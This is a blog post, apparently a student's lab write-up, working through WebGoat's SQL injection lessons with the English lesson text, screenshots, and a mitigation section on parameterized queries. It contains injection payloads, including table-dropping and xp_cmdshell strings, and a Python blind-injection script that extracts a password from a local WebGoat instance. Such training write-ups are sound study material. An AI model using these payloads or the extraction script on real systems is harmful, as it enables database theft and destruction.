<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>WebGoat实战: Injection | Time of Pi</title><meta name="keywords" content="WebGoat"><meta name="author" content="Foo"><meta name="copyright" content="Foo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="网络对抗原理实验（一）"><meta property="og:type" content="article"><meta property="og:title" content="WebGoat实战: Injection"><meta property="og:url" content="https://foopi.top/posts/f6ab3c74/index.html"><meta property="og:site_name" content="Time of Pi"><meta property="og:description" content="网络对抗原理实验（一）"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://img.foopi.top/cover/nicebrain.webp"><meta property="article:published_time" content="2021-06-01T04:52:46.000Z"><meta property="article:modified_time" content="2022-04-03T06:25:02.045Z"><meta property="article:author" content="Foo"><meta property="article:tag" content="WebGoat"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://img.foopi.top/cover/nicebrain.webp"><link rel="shortcut icon" href="https://img.foopi.top/img/favicon.webp"><link rel="canonical" href="https://foopi.top/posts/f6ab3c74/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//static.cloudflareinsights.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload='this.media="all"'><script defer data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;1167d76d896d415ebda0de73b6b5f2e8&quot;}"></script><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:void 0,translate:void 0,noticeOutdate:void 0,highlight:{plugin:"highlighjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:192},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!0},runtime:"天",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:void 0,lightbox:"fancybox",Snackbar:{chs_to_cht:"你已切换为繁体",cht_to_chs:"你已切换为简体",day_to_night:"你已切换为深色模式",night_to_day:"你已切换为浅色模式",bgLight:"#49b1f5",bgDark:"#121212",position:"bottom-left"},source:{justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js",css:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css"}},isPhotoFigcaption:!1,islazyload:!0,isAnchor:!0}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"WebGoat实战: Injection",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2022-04-03 14:25:02"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)}),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const t=saveToLocal.get("theme");"dark"===t?activateDarkMode():"light"===t&&activateLightMode();const o=saveToLocal.get("aside-status");void 0!==o&&("hide"===o?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})(window)</script><meta name="generator" content="Hexo 5.4.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/img/avatar.webp" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>links</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(https://img.foopi.top/cover/nicebrain.webp)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Time of Pi</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>links</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">WebGoat实战: Injection</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-06-01T04:52:46.000Z" title="发表于 2021-06-01 12:52:46">2021-06-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-04-03T06:25:02.045Z" title="更新于 2022-04-03 14:25:02">2022-04-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%83%B3%E8%A6%81%E6%AF%95%E4%B8%9A/">想要毕业</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%83%B3%E8%A6%81%E6%AF%95%E4%B8%9A/%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E5%8E%9F%E7%90%86/">网络对抗原理</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="WebGoat实战: Injection"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="SQL-Injection-intro">SQL Injection (intro)</h2><h3 id="What-is-SQL">What is SQL?</h3><p>SQL is a standardized (ANSI in 1986, ISO in 1987) programming language which is used for managing relational databases and performing various operations on the data in them.</p><p>A database is a collection of data. Data is organized into rows, columns and tables, and it is indexed to make it easier to find relevant information.</p><p>Example SQL table with employees, the name of the table is ‘employees’:</p><p>Employees Table</p><table><thead><tr><th>userid</th><th>first_name</th><th>last_name</th><th>department</th><th>salary</th><th>auth_tan</th></tr></thead><tbody><tr><td>32147</td><td>Paulina</td><td>Travers</td><td>Accounting</td><td>$46.000</td><td>P45JSI</td></tr><tr><td>89762</td><td>Tobi</td><td>Barnett</td><td>Development</td><td>$77.000</td><td>TA9LL1</td></tr><tr><td>96134</td><td>Bob</td><td>Franco</td><td>Marketing</td><td>$83.700</td><td>LO9S2V</td></tr><tr><td>34477</td><td>Abraham</td><td>Holman</td><td>Development</td><td>$50.000</td><td>UU2ALK</td></tr><tr><td>37648</td><td>John</td><td>Smith</td><td>Marketing</td><td>$64.350</td><td>3SL99A</td></tr></tbody></table><p>A company saves the following information of an employee in their databases: a unique employee number, the lastnname, the firstname, the department of the employee, the salary and an auth_tan.</p><p>One row represents one employee of the company.</p><p>By using SQL queries you can modify a database table and its index structures, add, update and delete rows of data.</p><p>There are three types of SQL commands in the SQL database language: Each type of command carries the danger of violating different protection goals if an intruder attacks your database system.</p><p>The 3 main protection goals in information security are confidentiality, integrity, and availability are considered the three most crucial components of information security. Go ahead to the next pages to get some details on the different types of commands and protections goals.</p><p>If you are still struggling with SQL and need more information or practice you can visit <a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.sqlcourse.com/">http://www.sqlcourse.com/</a> for an interactive and free online training.</p><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210531103338670.webp" alt="image-20210531103338670" style="zoom:50%"><h4 id="Data-Manipulation-Language-DML">Data Manipulation Language (DML)</h4><p>As the name says data manipulation language deals with the manipulation of data and includes the most common SQL statements such as SELECT, INSERT, UPDATE, DELETE, etc., and it is used for requesting a result set of records from database tables (select), adding (insert), deleting and modifying (update) data in a database.</p><p>If an attacker uses SQL injection of the DML type to manipulate your database, he will violate the following of the three protection goals in information security: confidentiality (…) &amp; integrity (update) (Only people authorized to read the data can do so).</p><ul><li>DML commands are used for storing, retrieving, modifying, and deleting data.</li><li>SELECT - retrieve data from a database</li><li>INSERT - insert data into a table</li><li>UPDATE - updates existing data within a table</li><li>DELETE - Delete all records from a database table</li></ul><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210531105719757.webp" alt="image-20210531105719757" style="zoom:50%"><h4 id="Data-Definition-Language-DDL">Data Definition Language (DDL)</h4><p>Data definition language includes commands for defining data structures, especially database schemas which tell how the data should reside in the database.</p><p>If an attacker uses SQL injection of the DDL type to manipulate your database, he will violate the following of the three protection goals in information security: integrity (alter) &amp; availability (drop). (Only people authorized to change/delete the data can do so.)</p><ul><li>DDL commands are used for creating, modifying, and dropping the structure of database objects.</li><li>CREATE - to create a database and its objects like (table, views, …)</li><li>ALTER - alters the structure of the existing database</li><li>DROP - delete objects from the database</li><li>Example:<ul><li>CREATE TABLE employees(<br>userid varchar(6) not null primary key,<br>first_name varchar(20),<br>last_name varchar(20),<br>department varchar(20),<br>salary varchar(10),<br>auth_tan varchar(6)<br>);</li></ul></li></ul><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210531110214472.webp" alt="image-20210531110214472" style="zoom:50%"><h4 id="Data-Control-Language-DCL">Data Control Language (DCL)</h4><p>Data control language is used to create privileges to allow users to access and manipulate the database.</p><p>If an attacker uses SQL injection of the DCL type to manipulate your database, he will violate the following of the three protection goals in information security: confidentiality (grant) &amp; availability (revoke) (Unwanted people could grand themselves admin privileges or revoke the admin rights from an administrator)</p><ul><li>DCL commands are used for providing security to database objects.</li><li>GRANT - allow users access privileges to the database</li><li>REVOKE - withdraw users access privileges given by using the GRANT command</li></ul><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210531110714160.webp" alt="image-20210531110714160" style="zoom:50%"><h3 id="What-is-SQL-injection">What is SQL injection?</h3><p>SQL injections are the most common web hacking techniques. <strong>A SQL injection attack consists of insertion or “injection” of malicious code via the SQL query input from the client to the application.</strong> If not dealt with correctly, such an injection of code into the application can have an serious impact on e.g. data integrity and security.</p><p>SQL injections can occur, when unfiltered data from the client, e.g. the input of a search field, gets into the SQL interpreter of the application itself. If the input from the client does not get checked for containing SQL commands, hackers can easily manipulate the underlying SQL statement to their advantage.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;SELECT * FROM users WHERE name = &#x27;&quot; + userName + &quot;&#x27;&quot;;<br></code></pre></td></tr></table></figure><p>Here are some examples of what a hacker could supply to the input field to perform actions on the database that go further than just reading the data of a single user:</p><ul><li><code>Smith’ OR '1' = '1</code><br>results in <code>SELECT * FROM users WHERE name = 'Smith' OR TRUE;</code> and that way will return all entries from the users table</li><li><code>Smith’ OR 1 = 1; --</code><br>results in <code>SELECT * FROM users WHERE name = 'Smith' OR TRUE;--';</code> and that way will return all entries from the users table</li><li><code>Smith’; DROP TABLE users; TRUNCATE audit_log; --</code><br>chains multiple SQL-Commands and deletes the USERS table as well as entries from the audit_log</li></ul><h3 id="Consequences-of-SQL-injection">Consequences of SQL injection</h3><p>A successful SQL injection exploit can:</p><ul><li>Read and modify sensitive data from the database</li><li>Execute administration operations on the database<ul><li>Shutdown auditing or the DBMS</li><li>Truncate tables and logs</li><li>Add users</li></ul></li><li>Recover the content of a given file present on the DBMS file system</li><li>Issue commands to the operating system</li></ul><p>SQL injection attacks allow attackers to</p><ul><li>Spoof identity</li><li>Tamper with existing data</li><li>Cause repudiation issues such as voiding transactions or changing balances</li><li>Allow the complete disclosure of all data on the system</li><li>Destroy the data or make it otherwise unavailable</li><li>Become administrator of the database server</li></ul><h3 id="Severity-of-SQL-injection">Severity of SQL injection</h3><p>The severity of SQL injection attacks is limited by</p><ul><li>Attacker’s skill and imagination</li><li>Defense in depth countermeasures<ul><li>Input validation</li><li>Least privilege</li></ul></li><li>Database technology</li></ul><p>Not all databases support command chaining</p><ul><li>Microsoft Access</li><li>MySQL Connector/J and C</li><li>Oracle</li></ul><p>SQL injection is more common in PHP, Classic ASP, Cold Fusion and older languages</p><ul><li>Languages that do not provide parameterized query support</li><li>Parameterized queries have been added to newer versions</li><li>Early adopters of web technology (i.e. Old Code)</li></ul><p>Not all databases are equal (SQL Server)</p><ul><li>Command shell: <code>master.dbo.xp_cmdshell 'cmd.exe dir c:'</code></li><li>Registry commands: <code>xp_regread</code>, <code>xp_regdeletekey</code>, …</li></ul><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210531113400990.webp" alt="image-20210531113400990" style="zoom:50%"> <img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210531114008241.webp" alt="image-20210531114008241" style="zoom:50%"> <img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210531115227436.webp" alt="image-20210531115227436" style="zoom:50%"> <img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210531115758586.webp" alt="image-20210531115758586" style="zoom:50%"> <img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210531131408420.webp" alt="image-20210531131408420" style="zoom:50%"><p><code>update';drop table access_log</code> 讲道理这突然绿了我是没想到的。没想到吧？应该还有个引号没处理。</p><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210531120841567.webp" alt="image-20210531120841567" style="zoom:50%"><h2 id="SQL-Injection-advanced">SQL Injection (advanced)</h2><h3 id="Special-Characters">Special Characters</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/* */ 	 are inline comments<br>-- , # 	 are line comments<br><br>Example: SELECT * FROM users WHERE name = &#x27;admin&#x27; --AND pass = &#x27;pass&#x27;<br>;    allows query chaining<br><br>Example: SELECT * FROM users; DROP TABLE users;<br>&#x27;,+,||	 allows string concatenation<br>Char()	 strings without quotes<br><br>Example: SELECT * FROM users WHERE name = &#x27;+char(27) OR 1=1<br></code></pre></td></tr></table></figure><h3 id="Special-Statements">Special Statements</h3><h4 id="Union">Union</h4><p>The Union operator is used, to combine the results of two or more SELECT Statements.</p><p>Rules to keep in mind, when working with a UNION:</p><ul><li>The number of columns selected in each statement must be the same.</li><li>The datatype of the first column in the first SELECT statement, must match the datatype of the first column in the second (third, fourth, …) SELECT Statement. The Same applies to all other columns.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT first_name FROM user_system_data UNION SELECT login_count FROM user_data;<br></code></pre></td></tr></table></figure><p>The UNION ALL Syntax also allows duplicate Values.</p><h4 id="Joins">Joins</h4><p>The Join operator is used to combine rows from two ore more tables, based on a related column</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT * FROM user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;<br></code></pre></td></tr></table></figure><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210601113124241.webp" alt="image-20210601113124241" style="zoom:50%"><h3 id="Blind-SQL-injection-盲注">Blind SQL injection 盲注</h3><p>Blind SQL injection is a type of SQL injection attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.</p><h4 id="Difference">Difference</h4><p>Let us first start with the difference between a normal SQL injection and a blind SQL injection. In a normal SQL injection the error messages from the database are displayed and gives enough information to find out how the query is working. Or in the case of an UNION based SQL injection the application does not reflect the information directly on the web page. So in the case where nothing is displayed you will need to start asking the database questions based on a true or false statement. That is why a blind SQL injection is much more difficult to exploit.</p><p>There are several different types of blind SQL injections: <strong>content-based</strong> and <strong>time-based</strong> SQL injections.</p><h4 id="Example">Example</h4><p>In this case we are trying to ask the database a boolean question based on for example an unique id, for example suppose we have the following url: <code>https://my-shop.com?article=4</code> On the server side this query will be translated as follows:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT * FROM articles WHERE article_id = 4<br></code></pre></td></tr></table></figure><p>When we want to exploit this we change the url into: <code>https://shop.example.com?article=4 AND 1=1</code> This will be translated to:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT * FROM articles WHERE article_id = 4 and 1 = 1<br></code></pre></td></tr></table></figure><p>If the browser will return the same page as it used to when using <code>https://shop.example.com?article=4</code> you know the website is vulnerable for a blind SQL injection. If the browser responds with a page not found or something else you know a blind SQL injection might not work. You can now change the SQL query and test for example: <code>https://shop.example.com?article=4 AND 1=2</code> which will not return anything because the query returns false.</p><p>So but how do we actually take advantage of this? Above we only asked the database for trivial question but you can for example also use the following url: <code>https://shop.example.com?article=4 AND substring(database_version(),1,1) = 2</code></p><p>Most of the time you start by finding which type of database is used, based on the type of database you can find the system tables of the database you can enumerate all the tables present in the database. With this information you can start getting information from all the tables and you are able to dump the database. Be aware that this approach might not work if the privileges of the database are setup correctly (meaning the system tables cannot be queried with the user used to connect from the web application to the database).</p><p>Another way is called a time-based SQL injection, in this case you will ask the database to wait before returning the result. You might need to use this if you are totally blind so there is no difference between the response you can use for example:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">article = 4; sleep(10) --<br></code></pre></td></tr></table></figure><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210601132454728.webp" alt="image-20210601132454728" style="zoom:50%"><p>这道题的暗坑是最后需要用<code>tom</code>登陆而不是<code>Tom</code>，首字母大写的用户名<code>Tom</code>甚至能直接注册。</p><p>两份参考思路：</p><p>利用BurpSuite：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.richar.top/2020/10/03/WebGoat-2-Injection/">WebGoat之路-2-Injection</a></p><p>使用python脚本：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.freebuf.com/column/221947.html">历史最全 WebGoat 8.0 通关攻略</a></p><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210601132705529.webp" alt="image-20210601132705529" style="zoom:50%"><p>猜测用户密码存储在<code>password</code>字段，<code>tom' or password='123</code>没有返回错误 :D</p><p>第一次使用<code>burpsuite</code>，随便找了份文档<a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/u011781521/article/details/54772795">BurpSuite系列(五)----Intruder模块(暴力破解)</a></p><p>当猜测密码长度与实际密码长度相同时，注册失败，返回提示<code>&quot;User &#123;0&#125; already exists please try to register with a different username.&quot;</code>因此进行如下尝试：</p><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210601151043797.webp" alt="image-20210601151043797" style="zoom:50%"> <img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210601151138749.webp" alt="image-20210601151138749" style="zoom:50%"><p>卑微社区版用户只能手动打标记or2</p><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210601152140183.webp" alt="image-20210601152140183" style="zoom:50%"><p><code>start attack</code>后，可知密码长度为23：</p><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210601152252553.webp" alt="image-20210601152252553" style="zoom:50%"><p>burpsuite社区版爆破实在太慢了，朋友说能改线程数，我没能找到，大概是被阉割了。参考了原本放弃的python脚本版解法，发现并不难理解，稍作修改，跑出密码<code>thisisasecretfortomonly</code>。</p><p>最后多的两个符号有点奇怪？</p><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/postpic/image-20210601163435366.webp" alt="image-20210601163435366" style="zoom:50%"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>chars = string.printable<br><br>vul_url = <span class="hljs-string">&quot;http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge&quot;</span><br><br>headers = &#123;<br>  <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;</span>,<br>  <span class="hljs-string">&#x27;X-Requested-With&#x27;</span>: <span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span><br>&#125;<br>cookies = &#123;<br>  <span class="hljs-string">&#x27;JSESSIONID&#x27;</span>: <span class="hljs-string">&#x27;omFlKtq6XQFLTN2E3uHjKkZ2i_JZB8edIVKLm57s&#x27;</span>,<br>&#125;<br><br>i = <span class="hljs-number">0</span><br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>  i += <span class="hljs-number">1</span><br>  tmp = result<br>  <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> chars:<br>    data = <span class="hljs-string">&quot;username_reg=tom&#x27; and substr(password,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27; --&amp;email_reg=tom%40webgoat.dev&amp;password_reg=123&amp;confirm_password_reg=123&quot;</span>.<span class="hljs-built_in">format</span>(i, char)<br>    resp = requests.put(vul_url, data=data, headers=headers, cookies=cookies)<br>    <span class="hljs-comment">#print(resp.text)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;already exists&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>      result += char<br>      <span class="hljs-built_in">print</span>(result)<br>  <span class="hljs-keyword">if</span> tmp == result:<br>    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="SQL-Injection-mitigation">SQL Injection (mitigation)</h2><h3 id="Immutable-Queries">Immutable Queries</h3><p>These are the best defense against SQL injection. They either do not have data that could get interpreted or they treat the data as a single entity that is bound to a column without interpretation.</p><h4 id="Static-Queries">Static Queries</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT * FROM products;<br>SELECT * FROM users WHERE user = &quot;&#x27;&quot; + session.getAttribute(&quot;UserID&quot;) + &quot;&#x27;&quot;;<br></code></pre></td></tr></table></figure><h4 id="Parameterized-Queries">Parameterized Queries</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">String query = &quot;SELECT * FROM users WHERE last_name = ?&quot;;<br>PreparedStatement statement = connection.prepareStatement(query);<br>statement.setString(1, accountName);<br>ResultSet results = statement.executeQuery();<br></code></pre></td></tr></table></figure><h5 id="Parameterized-Queries-Java-Snippet">Parameterized Queries - Java Snippet</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public static bool isUsernameValid(string username) &#123;<br>    RegEx r = new Regex(&quot;^[A-Za-z0-9]&#123;16&#125;$&quot;);<br>    return r.isMatch(username);<br>&#125;<br><br>// java.sql.Connection conn is set elsewhere for brevity.<br>PreparedStatement ps = null;<br>RecordSet rs = null;<br>try &#123;<br>    pUserName = request.getParameter(&quot;UserName&quot;);<br>    if ( isUsernameValid (pUsername) ) &#123;<br>        ps = conn.prepareStatement(&quot;SELECT * FROM user_table<br>                                   WHERE username = ? &quot;);<br>        ps.setString(1, pUsername);<br>        rs = ps.execute();<br>        if ( rs.next() ) &#123;<br>            // do the work of making the user record active in some way<br>        &#125;<br>    &#125; else &#123; // handle invalid input &#125;<br>&#125;<br>catch (...) &#123; // handle all exceptions ... &#125;<br></code></pre></td></tr></table></figure><h5 id="Parameterized-Queries-Java-Example">Parameterized Queries - Java Example</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public static String loadAccount() &#123;<br>  // Parser returns only valid string data<br>  String accountID = getParser().getStringParameter(ACCT_ID, &quot;&quot;);<br>  String data = null;<br>  String query = &quot;SELECT first_name, last_name, acct_id, balance FROM user_data WHERE acct_id = ?&quot;;<br>  try (Connection connection = null;<br>       PreparedStatement statement = connection.prepareStatement(query)) &#123;<br>     statement.setString(1, accountID);<br>     ResultSet results = statement.executeQuery();<br>     if (results != null &amp;&amp; results.first()) &#123;<br>       results.last(); // Only one record should be returned for this query<br>       if (results.getRow() &lt;= 2) &#123;<br>         data = processAccount(results);<br>       &#125; else &#123;<br>         // Handle the error - Database integrity issue<br>       &#125;<br>     &#125; else &#123;<br>       // Handle the error - no records found &#125;<br>     &#125;<br>  &#125; catch (SQLException sqle) &#123;<br>    // 